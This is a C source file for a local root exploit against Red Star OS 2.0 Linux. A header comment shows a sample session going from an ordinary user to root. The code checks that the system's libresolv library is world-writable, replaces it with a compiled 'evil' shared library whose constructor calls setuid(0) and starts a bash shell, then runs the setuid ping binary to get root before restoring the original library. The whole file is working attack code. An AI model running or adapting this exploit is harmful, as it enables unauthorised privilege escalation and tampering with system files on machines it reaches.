/*
*             N.Korea RedStar 2.0 Linux local root exploit
*
*                                               - 2012.03.30
*
* [user@RedStar2 exp]$ uname -a
* Linux RedStar2 2.6.25-14.rs2.0.i686 #1 SMP Fri Jul 24 19:10:00 KST 2009 i686 i686 i386 GNU/Linux
* [user@RedStar2 exp]$ ls -al /lib/libresolv-2.5.so
* -rwxrwxrwx 1 root root 74612 4ì›”  1 07:08 /lib/libresolv-2.5.so
* [user@RedStar2 exp]$ rpm -qf /lib/libresolv-2.5.so
* glibc-2.5-3.rs2.0
* [user@RedStar2 exp]$ id
* uid=500(user) gid=500(user) groups=500(user)
* [user@RedStar2 exp]$ gcc -o rs-linux-local-root rs-linux-local-root.c
* [user@RedStar2 exp]$ ./rs-linux-local-root
* RedStar 2.0 Linux (N.Korea) root exploit
* 
* [*] Preparing for the attack...
* [-] Checking '/lib/libresolv-2.5.so' file... yes!
* [-] Checking '/bin/ping' file... yes!
* [-] Checking '/usr/bin/gcc' file... yes!
* [*] Backup the original library... ok!
* [*] Create the evil library.... ok!
* [*] Inject evil code into library.... ok!
* [*] Goooooooooood luck!!
* [root@RedStar2 exp]# id
* uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
* [root@RedStar2 exp]# ps
*  PID TTY          TIME CMD
*  7421 pts/4    00:00:00 bash
*  7707 pts/4    00:00:00 su
*  9291 pts/4    00:00:00 ping
*  9292 pts/4    00:00:00 bash
*  9299 pts/4    00:00:00 ps
* [root@RedStar2 exp]# exit
* exit
* Usage: ping [-LRUbdfnqrvVaA] [-c count] [-i interval] [-w deadline]
*             [-p pattern] [-s packetsize] [-t ttl] [-I interface or address]
*             [-M mtu discovery hint] [-S sndbuf]
*             [ -T timestamp option ] [ -Q tos ] [hop1 ...] destination
* [*] Cleanup!
* ok!
* [user@RedStar2 exp]$
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>

#define TARGET_LIB	"/lib/libresolv-2.5.so"
#define BACKUP_FILE	"libresolv.so.orig"
#define EVIL_FILE	"evil.so"
#define EVIL_SOURCE	"evil.c"

const char *banner = "RedStar 2.0 Linux (N.Korea) root exploit";

int exploitable(void)
{
	struct stat st;
	int i = 0;
	const char *cfile[] = { TARGET_LIB, "/bin/ping", "/usr/bin/gcc", NULL };
	int perms[] = { S_IWOTH, S_ISUID, S_IXOTH };

	fprintf(stdout, "[*] Preparing for the attack...\n");

	while(cfile[i] != NULL) {
		fprintf(stdout, "[-] Checking '%s' file... ", cfile[i]);

		if(stat(cfile[i], &st) < 0) {
			fprintf(stdout, "failed\n");
			return -1;
		}
		if(st.st_mode & perms[i]) {
			fprintf(stdout, "yes!\n");
		} else {
			fprintf(stdout, "failed.\n");
			return -1;
		}
		i++;
	}
	return 0;
}

int copy(const char *s, const char *d, const char *prompt)
{
	int fd = 0, fd2 = 0, n = 0;
	char *bfile = BACKUP_FILE;
	char buf[1024];

	fprintf(stdout, "%s", prompt);
	if((fd = open(s, O_RDONLY)) < 0) {
		fprintf(stderr, "\n[!] Can't open file: %s\n", s);
		goto failed;
	}
	unlink(d);
	if((fd2 = open(d, O_RDWR|O_CREAT, 0777)) < 0) {
		fprintf(stderr, "\n[!] Can't open file: %s\n", d);
		goto failed;
	}
	while(1) {
		if((n = read(fd, buf, sizeof(buf))) <= 0)
			break;
		if(write(fd2, buf, n) < 0) {
			fprintf(stderr, "\n[!] File write error\n");
			goto failed;
		}
	}
	close(fd); close(fd2);
	fprintf(stdout, "ok!\n");
	return 0;
failed:
	if(fd > 0) close(fd);
	if(fd2 > 0) close(fd2);

	return -1;
}

int main(void)
{
	FILE *fp = NULL;
	char *prompt = NULL;
	char cmdline[1024];
	struct stat st;

	fprintf(stdout, "%s\n\n", banner);

	if(exploitable() < 0) {
		fprintf(stdout, "[!] This machine is not vulnerable\n");
		return -1;
	}

	prompt = "[*] Backup the original library... ";
	if(copy(TARGET_LIB, BACKUP_FILE, prompt) < 0)
		goto cleanup;

	fprintf(stdout, "[*] Create the evil library.... ");
	unlink(EVIL_SOURCE);
	umask(0066);
	if((fp = fopen(EVIL_SOURCE, "w")) == NULL) {
		fprintf(stdout, "failed\n");
		goto cleanup;
	}
	fprintf(fp, 
		"void __attribute__((constructor)) init(void) {\n"
		"setgid(0); setuid(0); initgroups(\"root\",0);\n"
		"system(\"/bin/bash\"); }\n");

	fclose(fp); fp = NULL;
	snprintf(cmdline, sizeof(cmdline),
		"gcc -s -fPIC -w -shared -o %s %s 2>/dev/null", 
		EVIL_FILE, EVIL_SOURCE);
	system(cmdline);
	if(stat(EVIL_FILE, &st) < 0) {
		fprintf(stdout, "failed\n");
		goto cleanup;
	}
	fprintf(stdout, "ok!\n");

	prompt = "[*] Inject evil code into library.... ";
	if(copy(EVIL_FILE, TARGET_LIB, prompt) < 0) 
		goto cleanup;
		
	fprintf(stdout, "[*] Goooooooooood luck!!\n");
	system("ping");
	prompt = "[*] Cleanup!\n";
	copy(BACKUP_FILE, TARGET_LIB, prompt);
	
cleanup:
	unlink(EVIL_FILE); unlink(EVIL_SOURCE);
	unlink(BACKUP_FILE);

	if(fp != NULL)
		fclose(fp);	
	return 0;
}
